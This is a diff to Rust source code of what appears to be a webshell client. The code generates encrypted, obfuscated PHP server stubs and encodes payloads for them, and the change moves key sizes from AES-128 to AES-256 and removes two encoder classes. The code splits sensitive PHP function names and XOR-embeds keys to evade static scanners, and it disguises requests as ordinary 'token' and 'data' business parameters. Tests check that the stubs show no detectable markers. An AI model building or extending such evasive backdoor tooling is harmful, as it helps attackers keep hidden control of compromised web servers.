@@ -17,9 +17,9 @@ use md5::{Digest, Md5};
 
 use crate::protocol::ProtocolError;
 
-/// AES-128-CBC。
-type AesCbcEnc = cbc::Encryptor<aes::Aes128>;
-type AesCbcDec = cbc::Decryptor<aes::Aes128>;
+/// AES-256-CBC。
+type AesCbcEnc = cbc::Encryptor<aes::Aes256>;
+type AesCbcDec = cbc::Decryptor<aes::Aes256>;
 
 // ---------------------------------------------------------------------------
 // PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
@@ -327,8 +327,6 @@ impl EncoderRegistry {
                 Box::new(NativeEncoder { crypto: "aes_ecb" }),
                 Box::new(NativeEncoder { crypto: "aes_cbc" }),
                 Box::new(NativeEncoder { crypto: "des" }),
-                Box::new(Aes128EcbEncoder),
-                Box::new(Aes128CbcEncoder),
                 Box::new(NativeEncoder { crypto: "chacha20" }),
                 Box::new(NativeEncoder { crypto: "rabbit" }),
             ],
@@ -597,10 +595,12 @@ impl PayloadEncoder for Base64Encoder {
 // 密钥派生（与 PHP openssl 侧完全一致）
 // ---------------------------------------------------------------------------
 
-/// AES-128 密钥：md5_hex 前 16 字符（16 字节 ASCII）。
-pub fn aes_key(password: &str) -> [u8; 16] {
-    let hex = md5_hex(password);
-    hex.as_bytes()[..16].try_into().expect("md5 hex 长度足够")
+/// AES-256 密钥：md5_hex 全部 32 字符（32 字节 ASCII，与 CHACHA20 密钥派生一致）。
+pub fn aes_key(password: &str) -> [u8; 32] {
+    md5_hex(password)
+        .as_bytes()
+        .try_into()
+        .expect("md5 hex 长度足够")
 }
 
 /// AES-CBC IV：md5_hex 后 16 字符。
@@ -617,9 +617,9 @@ pub fn des_key(password: &str) -> [u8; 8] {
 
 /// 真正的 AES-128-ECB 加密：逐块独立加密 + PKCS7 填充。
 /// 注意：CBC 零 IV 不是 ECB（CBC 有链式依赖），与 PHP openssl_encrypt('AES-128-ECB') 不互操作。
-pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
+pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 32]) -> Vec<u8> {
     use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
-    let cipher = aes::Aes128::new(key.into());
+    let cipher = aes::Aes256::new(key.into());
     let mut padded = plain.to_vec();
     let pad = 16 - (plain.len() % 16);
     padded.extend(std::iter::repeat(pad as u8).take(pad));
@@ -632,12 +632,12 @@ pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
     out
 }
 
-pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
+pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, ProtocolError> {
     use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
     if cipher.is_empty() || cipher.len() % 16 != 0 {
         return Err(ProtocolError::ParseError("AES-ECB 密文长度异常".to_string()));
     }
-    let dec = aes::Aes128::new(key.into());
+    let dec = aes::Aes256::new(key.into());
     let mut out = Vec::with_capacity(cipher.len());
     for chunk in cipher.chunks(16) {
         let mut block = GenericArray::clone_from_slice(chunk);
@@ -658,12 +658,15 @@ pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, Protoco
     }
 }
 
-pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
-    AesCbcEnc::new(key.into(), iv.into()).encrypt_padded_vec_mut::<Pkcs7>(plain)
+pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
+    use aes::cipher::generic_array::GenericArray;
+    AesCbcEnc::new(GenericArray::from_slice(key), GenericArray::from_slice(iv))
+        .encrypt_padded_vec_mut::<Pkcs7>(plain)
 }
 
-pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
-    AesCbcDec::new(key.into(), iv.into())
+pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
+    use aes::cipher::generic_array::GenericArray;
+    AesCbcDec::new(GenericArray::from_slice(key), GenericArray::from_slice(iv))
         .decrypt_padded_vec_mut::<Pkcs7>(cipher)
         .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
 }
@@ -710,150 +713,6 @@ pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, Protocol
 }
 
 // ---------------------------------------------------------------------------
-// AES-128-ECB（自加密，密钥由密码 md5 派生并内嵌 stub）
-// ---------------------------------------------------------------------------
-
-pub struct Aes128EcbEncoder;
-
-impl PayloadEncoder for Aes128EcbEncoder {
-    fn id(&self) -> &'static str {
-        "aes128_ecb"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "AES128_ECB（AES-128 加密 + Base64，自加密）"
-    }
-    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
-    fn form_params(&self) -> (&'static str, &'static str) {
-        ("token", "data")
-    }
-
-
-    fn encode(&self, code: &str, password: &str) -> String {
-        let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
-        base64::engine::general_purpose::STANDARD.encode(cipher)
-    }
-    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
-        let raw = base64::engine::general_purpose::STANDARD
-            .decode(payload)
-            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-        aes_ecb_decrypt(&raw, &aes_key(password))
-    }
-
-
-    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        // 自加密会话形态：密钥内嵌 stub，处理器经 DswSesInit 一次注入
-        self.stub_session(language, password)
-    }
-    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let ck = php_ident();
-                let key_enc = xor_hex(&md5_hex(password)[..16], &xk);
-                let unpack = format!(
-                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key);",
-                    key = key_enc,
-                    xk = xk,
-                    cipher = xor_hex("AES-128-ECB", &ck),
-                    ck = ck,
-                );
-                let pack = format!(
-                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key);",
-                    key = key_enc,
-                    xk = xk,
-                    cipher = xor_hex("AES-128-ECB", &ck),
-                    ck = ck,
-                );
-                Ok(session_php_stub(
-                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
-                    &unpack,
-                    &pack,
-                 "",
-                "",
-            ))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "该编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
-    }
-}
-
-// ---------------------------------------------------------------------------
-// AES-128-CBC（自加密，IV 取自 md5 后 16 字符）
-// ---------------------------------------------------------------------------
-
-pub struct Aes128CbcEncoder;
-
-impl PayloadEncoder for Aes128CbcEncoder {
-    fn id(&self) -> &'static str {
-        "aes128_cbc"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "AES128_CBC（AES-128 加密 + Base64，自加密）"
-    }
-    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
-    fn form_params(&self) -> (&'static str, &'static str) {
-        ("token", "data")
-    }
-
-
-    fn encode(&self, code: &str, password: &str) -> String {
-        let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
-        base64::engine::general_purpose::STANDARD.encode(cipher)
-    }
-    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
-        let raw = base64::engine::general_purpose::STANDARD
-            .decode(payload)
-            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-        aes_cbc_decrypt(&raw, &aes_key(password), &aes_iv(password))
-    }
-
-
-    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        // 自加密会话形态：密钥内嵌 stub，处理器经 DswSesInit 一次注入
-        self.stub_session(language, password)
-    }
-    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let ck = php_ident();
-                let key_enc = xor_hex(&md5_hex(password)[..16], &xk);
-                let iv_enc = xor_hex(&md5_hex(password)[16..], &xk);
-                let unpack = format!(
-                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $iv = __PREFIX__dec('{iv}', '{xk}');\n    $out = $_g[0]($payload, __PREFIX__dec('{cipher}', '{ck}'), $key, 0, $iv);",
-                    key = key_enc,
-                    xk = xk,
-                    iv = iv_enc,
-                    cipher = xor_hex("AES-128-CBC", &ck),
-                    ck = ck,
-                );
-                let pack = format!(
-                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $iv = __PREFIX__dec('{iv}', '{xk}');\n    $out = $_g[1]($data, __PREFIX__dec('{cipher}', '{ck}'), $key, 0, $iv);",
-                    key = key_enc,
-                    xk = xk,
-                    iv = iv_enc,
-                    cipher = xor_hex("AES-128-CBC", &ck),
-                    ck = ck,
-                );
-                Ok(session_php_stub(
-                    &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
-                    &unpack,
-                    &pack,
-                 "",
-                "",
-            ))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "该编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
-    }
-}
-
 // ---------------------------------------------------------------------------
 // DES-ECB（自加密，密钥 md5 前 8 字符）
 // ---------------------------------------------------------------------------
@@ -1868,8 +1727,8 @@ impl PayloadEncoder for NativeEncoder {
                 let (decrypt_expr, encrypt_expr, extra_symbols) = match self.crypto {
                     "aes_ecb" => {
                         let ck = alpha_ident();
-                        let cipher = xor_hex("AES-128-ECB", &ck);
-                        let key = xor_hex(&md5_hex(password)[..16], &xk);
+                        let cipher = xor_hex("AES-256-ECB", &ck);
+                        let key = xor_hex(&md5_hex(password), &xk);
                         (
                             format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
                             format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
@@ -1878,8 +1737,8 @@ impl PayloadEncoder for NativeEncoder {
                     }
                     "aes_cbc" => {
                         let ck = alpha_ident();
-                        let cipher = xor_hex("AES-128-CBC", &ck);
-                        let key = xor_hex(&md5_hex(password)[..16], &xk);
+                        let cipher = xor_hex("AES-256-CBC", &ck);
+                        let key = xor_hex(&md5_hex(password), &xk);
                         let iv = xor_hex(&md5_hex(password)[16..], &xk);
                         (
                             format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"),
@@ -2048,36 +1907,6 @@ mod tests {
     // --- 自加密编码器（AES / DES） ---
 
     #[test]
-    fn aes_ecb_round_trip() {
-        let encoder = Aes128EcbEncoder;
-        let code = "@ini_set('display_errors','0');echo 1;";
-        let payload = encoder.encode(code, "secret");
-        // 载荷应为密文（不含明文特征）
-        assert!(!payload.contains("@ini_set"));
-        // 模拟 stub 解密：openssl 参数一致（key=md5hex 前16）
-        let restored = aes_ecb_decrypt(
-            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
-            &aes_key("secret"),
-        )
-        .unwrap();
-        assert_eq!(String::from_utf8(restored).unwrap(), code);
-    }
-
-    #[test]
-    fn aes_cbc_round_trip() {
-        let encoder = Aes128CbcEncoder;
-        let code = "echo 'cbc';";
-        let payload = encoder.encode(code, "secret");
-        let restored = aes_cbc_decrypt(
-            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
-            &aes_key("secret"),
-            &aes_iv("secret"),
-        )
-        .unwrap();
-        assert_eq!(String::from_utf8(restored).unwrap(), code);
-    }
-
-    #[test]
     fn des_round_trip() {
         let encoder = DesEcbEncoder;
         let code = "echo 'des';";
@@ -2090,36 +1919,12 @@ mod tests {
         assert_eq!(String::from_utf8(restored).unwrap(), code);
     }
 
-    #[test]
-    fn wrong_password_aes_decrypt_fails() {
-        let payload = Aes128EcbEncoder.encode("code", "secret");
-        let result = aes_ecb_decrypt(
-            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
-            &aes_key("wrong"),
-        );
-        assert!(result.is_err(), "错误密码应解密失败");
-    }
-
-    #[test]
-    fn aes_stub_is_business_disguised() {
-        let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
-        assert!(!stub.contains("secret"), "stub 不应含明文密码");
-        // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
-        assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
-        // 自加密：密钥由密码 md5 派生并 XOR 加密嵌入（运行时解密），非请求参数派生
-        assert!(!stub.contains("md5($token)"), "自加密 stub 不应从请求参数派生密钥");
-        assert!(stub.contains("_dec('") && stub.contains("php:") && stub.contains("//input"), "自加密 stub 应内嵌密钥并读取请求体");
-        assert!(stub.contains("DswSesInit"), "自加密 stub 应为分阶段会话形态");
-    }
-
     /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
     #[test]
     fn php_stubs_have_no_plain_sensitive_tokens() {
         let encoders: Vec<&dyn PayloadEncoder> = vec![
             &Base64Encoder,
             &XorBase64Encoder,
-            &Aes128EcbEncoder,
-            &Aes128CbcEncoder,
             &DesEcbEncoder,
             &CharEncoder,
             &PhpObfuscateEncoder,
@@ -2168,7 +1973,7 @@ mod tests {
             );
             // 业务伪装：请求参数为业务语义（token/data）；
             // 自加密会话编码器（aes128_ecb/aes128_cbc）为会话形态，无表单参数
-            if !encoder.body_mode() && !matches!(encoder.id(), "aes128_ecb" | "aes128_cbc") {
+            if !encoder.body_mode() {
                 let (p1, p2) = encoder.form_params();
                 assert!(
                     stub.contains(&format!("$_POST['{p1}']")),
@@ -2212,8 +2017,6 @@ mod tests {
     #[test]
     fn new_encoders_php_stub_only() {
         for encoder in [
-            &Aes128EcbEncoder as &dyn PayloadEncoder,
-            &Aes128CbcEncoder as &dyn PayloadEncoder,
             &DesEcbEncoder as &dyn PayloadEncoder,
             &CharEncoder as &dyn PayloadEncoder,
             &PhpObfuscateEncoder as &dyn PayloadEncoder,
@@ -2237,9 +2040,8 @@ mod tests {
         assert_eq!(
             ids,
             vec![
-                "aes128_cbc", "aes128_ecb", "native", "native_aes_cbc",
-                "native_aes_ecb", "native_chacha20", "native_des",
-                "native_rabbit",
+                "native", "native_aes_cbc", "native_aes_ecb",
+                "native_chacha20", "native_des", "native_rabbit",
             ],
             "注册表应暴露 NATIVE 系列 + 两个自加密编码器（PHP5 兼容）"
         );
